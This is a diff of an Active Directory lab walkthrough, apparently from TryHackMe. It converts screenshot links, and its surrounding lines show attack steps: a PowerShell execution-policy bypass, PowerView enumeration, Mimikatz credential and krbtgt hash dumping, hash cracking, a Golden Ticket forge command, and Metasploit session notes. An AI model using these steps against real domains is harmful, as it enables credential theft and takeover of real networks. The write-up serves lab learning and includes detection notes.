@@ -7,7 +7,8 @@ ___________________
     For this type of exploitation, we **require valid credentials**, even if they belong to a **low-privileged user**.
     
 
-![[Captura de pantalla 2026-02-28 131324.png]]  
+<img width="1199" height="333" alt="Captura de pantalla 2026-02-28 131324" src="https://github.com/user-attachments/assets/9d3067e3-31d3-4102-8614-70848d1bb5eb" />
+
 For this lab, **TryHackMe** provides valid credentials.
 
 - **Connection via SSH**
@@ -23,9 +24,11 @@ sshpass -p 'P@$$W0rd' ssh -o StrictHostKeyChecking=no Administrator@10.66.186.24
     Forces the session to start directly in a **Windows CMD shell**.
 
 
-![[Captura de pantalla 2026-02-28 174611.png]]  
-![[Captura de pantalla 2026-02-28 180103.png]]  
-    Here we show how we connect and start working with **PowerView**.
+<img width="760" height="26" alt="Captura de pantalla 2026-02-28 174611" src="https://github.com/user-attachments/assets/97f45b8b-8cfe-4064-a8d5-db8240c619bc" />
+  
+<img width="716" height="578" alt="Captura de pantalla 2026-02-28 180103" src="https://github.com/user-attachments/assets/18bcc7c4-a136-4e55-ad73-94247c0ce5e4" />
+
+Here we show how we connect and start working with **PowerView**.
 
 ### **1. Bypass execution policy**
 powershell -ep bypass
@@ -37,7 +40,7 @@ Get-NetUser | select cn
 ### **4. Enumerate domain groups**
 Get-NetGroup -GroupName *admin*
 
-![[Captura de pantalla 2026-02-28 184117.png]]
+<img width="623" height="123" alt="Captura de pantalla 2026-02-28 184117" src="https://github.com/user-attachments/assets/7e2fece0-7e57-4f8b-8a50-364ef15a68b6" />
 
 - **Invoke-ShareFinder** is a PowerShell function used to **discover shared folders (SMB shares)** across a Windows network.
 
@@ -56,7 +59,7 @@ It is used here to answer:
 - **SMBMap** → runs from **Linux attacker machine**
 - **Invoke-ShareFinder** → runs **inside the victim (PowerShell / AD context)**
 
-![[Captura de pantalla 2026-02-28 193335.png]]
+<img width="658" height="149" alt="Captura de pantalla 2026-02-28 193335" src="https://github.com/user-attachments/assets/338dfe3b-447e-4d38-b251-09bc54a36f75" />
 
 ```
 Get-NetComputer -FullData | select operatingsystem
@@ -156,14 +159,15 @@ sudo chmod 777 /home/kali/Desktop/AD/
 
      Enter the username and password **neo4j** as we set it up previously.
 
-![[Captura de pantalla 2026-03-03 193826.png]]
+<img width="1014" height="724" alt="Captura de pantalla 2026-03-03 193826" src="https://github.com/user-attachments/assets/ce9dcaea-21a3-4b00-b6ec-9f9ebf4dc1c8" />
      We see how **BloodHound** gives us the option to list the domain structures
  
-![[Captura de pantalla 2026-03-03 194154.png]]  
+<img width="1171" height="756" alt="Captura de pantalla 2026-03-03 194154" src="https://github.com/user-attachments/assets/b6ed056c-bcee-4c48-83b8-2604ccb98b15" />
     For example, extracting information from Kerberos
 
-![[Captura de pantalla 2026-03-03 194754.png]]  
-![[Captura de pantalla 2026-03-03 195333.png]]
+<img width="495" height="685" alt="Captura de pantalla 2026-03-03 194754" src="https://github.com/user-attachments/assets/b457dc08-7108-4de6-b7c5-d4ef1bc4efae" />
+
+<img width="1850" height="422" alt="Captura de pantalla 2026-03-03 195333" src="https://github.com/user-attachments/assets/42b1f8ca-6305-4ed0-a9eb-b70c3c31204b" />
 
 - You can:
     - Visualize domain structure
@@ -209,8 +213,7 @@ privilege::debug
 ```
 lsadump::lsa /patch
 ```
-
-![[Captura de pantalla 2026-03-04 033821.png]]
+<img width="1022" height="612" alt="Captura de pantalla 2026-03-04 033821" src="https://github.com/user-attachments/assets/e29fcb17-b3e9-4b23-9107-ed53ef450753" />
 
 - **Cracking hashes**
 Due to VM limitations, **hashcat may not work properly**
@@ -220,11 +223,12 @@ Due to VM limitations, **hashcat may not work properly**
     - **John the Ripper**
     - **hashes.com**
 
-![[Captura de pantalla 2026-03-04 043516.png]]  
+<img width="841" height="243" alt="Captura de pantalla 2026-03-04 043516" src="https://github.com/user-attachments/assets/fc2e7b6d-ef08-4e96-9254-f2bc949dfd5e" />
 
-![[Captura de pantalla 2026-03-04 043449.png]]  
+<img width="1075" height="389" alt="Captura de pantalla 2026-03-04 043449" src="https://github.com/user-attachments/assets/ec199354-05f9-4986-9d98-7fd7c8248297" />
 
-![[Captura de pantalla 2026-03-04 172737.png]]
+<img width="1843" height="407" alt="Captura de pantalla 2026-03-04 172737" src="https://github.com/user-attachments/assets/c4f29d24-7040-4d66-8c82-0ed2ec7131b9" />
+
 
 
 
@@ -252,7 +256,7 @@ lsadump::lsa /inject /name:krbtgt
 ```
      - This returns the **Hash** and **security identifier** of the account
 
-![[Captura de pantalla 2026-03-04 190319.png]]
+<img width="737" height="402" alt="Captura de pantalla 2026-03-04 190319" src="https://github.com/user-attachments/assets/d1096342-d168-444f-9787-8f880ee0e234" />
 
 ---
 
@@ -262,7 +266,7 @@ lsadump::lsa /inject /name:krbtgt
 kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
 ```
 
-![[Captura de pantalla 2026-03-04 191154.png|697]]
+<img width="1376" height="436" alt="Captura de pantalla 2026-03-04 191154" src="https://github.com/user-attachments/assets/25d35b44-04cd-4468-b725-eb550ba34245" />
 
 ✔️ This confirms the **Golden Ticket is created**
 
@@ -274,7 +278,7 @@ kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-8494
 
     Connect via **RDP**, then open: **Server Manager → Tools**
 
-![[Captura de pantalla 2026-03-04 231701.png]]
+<img width="1024" height="750" alt="Captura de pantalla 2026-03-04 231701" src="https://github.com/user-attachments/assets/6530c04e-3a35-4ecd-9a3f-8bc4d40129a5" />
 
 ### Key tools:
 
@@ -289,15 +293,16 @@ kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-8494
 **Event Viewer**: This is the historical log of actions. Its function is to audit who did what, when, and from where, allowing you to detect logins, password changes, or object creation using specific event IDs (such as **4624** for successful logins).
 
 
-![[Captura de pantalla 2026-03-04 231754.png]]  
+<img width="372" height="700" alt="Captura de pantalla 2026-03-04 231754" src="https://github.com/user-attachments/assets/58c758ec-0f92-4c6b-b141-0238f7a2ae4a" />
+ 
 
-![[Captura de pantalla 2026-03-04 231903 1.png]]  
-    The Event Viewer's Perspective
+<img width="784" height="532" alt="Captura de pantalla 2026-03-04 231903" src="https://github.com/user-attachments/assets/519e501d-477b-4df5-bf90-3836278d151f" />
+     The Event Viewer's Perspective
 
-![[Captura de pantalla 2026-03-04 232132.png]]  
-      Perspective from the ***Active Directory Users and Computers***
+<img width="813" height="585" alt="Captura de pantalla 2026-03-04 232132" src="https://github.com/user-attachments/assets/3af077df-453b-4a47-a201-c5b36495e715" />
+    Perspective from the ***Active Directory Users and Computers***
 
-![[Captura de pantalla 2026-03-04 234412.png]]
+<img width="1828" height="423" alt="Captura de pantalla 2026-03-04 234412" src="https://github.com/user-attachments/assets/4f65d9e1-6141-4bc5-8587-3c61f7e30fcd" />
 
 
 
@@ -377,7 +382,7 @@ run
 
 - Sessions = communication channel attacker ↔ victim
 
-![[Captura de pantalla 2026-03-06 014231.png]]
+<img width="1261" height="218" alt="Captura de pantalla 2026-03-06 014231" src="https://github.com/user-attachments/assets/07e83ebc-427e-476a-a0dc-72ca4d162735" />
 ## **Types of sessions**
 
 **Meterpreter**: A powerful, dynamic payload that provides full access to the target machine, including a range of post-exploitation features such as keylogging, webcam control, and privilege escalation.
@@ -436,9 +441,11 @@ use modules
 
 
 
-![[Captura de pantalla 2026-03-06 025135.png]]
+<img width="931" height="233" alt="Captura de pantalla 2026-03-06 025135" src="https://github.com/user-attachments/assets/7e596c96-3d97-4741-9fe9-6452c6c4a653" />
+
 ## **show options**
 
 Displays required parameters:
 
-![[Captura de pantalla 2026-03-06 013946.png]]
+<img width="1070" height="603" alt="Captura de pantalla 2026-03-06 013946" src="https://github.com/user-attachments/assets/bb8e384f-91d4-4ea5-84cc-f14038cc55e9" />
+
